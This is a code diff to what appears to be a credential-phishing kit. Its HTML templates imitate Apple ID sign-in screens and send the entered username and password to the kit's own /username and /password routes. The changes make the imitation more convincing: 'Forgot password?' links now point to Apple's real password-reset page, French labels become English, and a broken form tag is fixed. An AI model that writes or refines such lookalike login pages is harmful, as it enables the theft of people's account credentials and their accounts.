@@ -217,14 +217,14 @@ username_screen = """
         <input type="checkbox" id="stay_connected" name="stay_connected">
         <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Forgot password?</a>
+    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
     <a href="#" class="link">Create Apple ID</a>
 </form>
 """
 
 password_screen = """
 <div class="username-box">
-    <div class="username-label">Courriel ou numéro de téléphone</div>
+    <div class="username-label">Email or phone number</div>
     <div class="username-value">{username}</div>
 </div>
 <form method="POST" action="/password">
@@ -237,15 +237,15 @@ password_screen = """
         <input type="checkbox" id="stay_connected" name="stay_connected">
         <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Forgot password?</a>
+    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
     <a href="#" class="link">Create Apple ID</a>
-</form
+</form>
 """
 
 error_screen = """
 <form method="POST" action="/username">
     <div class="input-container">
-        <input type="text" name="username" class="input-field" placeholder="Courriel ou numéro de téléphone" value="{username}" required>
+        <input type="text" name="username" class="input-field" placeholder="Email or phone number" value="{username}" required>
         <button type="submit" class="submit-btn">→</button>
     </div>
     <div class="error-message">
@@ -256,7 +256,7 @@ error_screen = """
         <input type="checkbox" id="stay_connected" name="stay_connected">
         <label for="stay_connected">Keep me signed in</label>
     </div>
-    <a href="#" class="link">Forgot password?</a>
+    <a href="https://iforgot.apple.com/password/verify/appleid" class="link">Forgot password?</a>
     <a href="#" class="link">Create Apple ID</a>
 </form>
 """
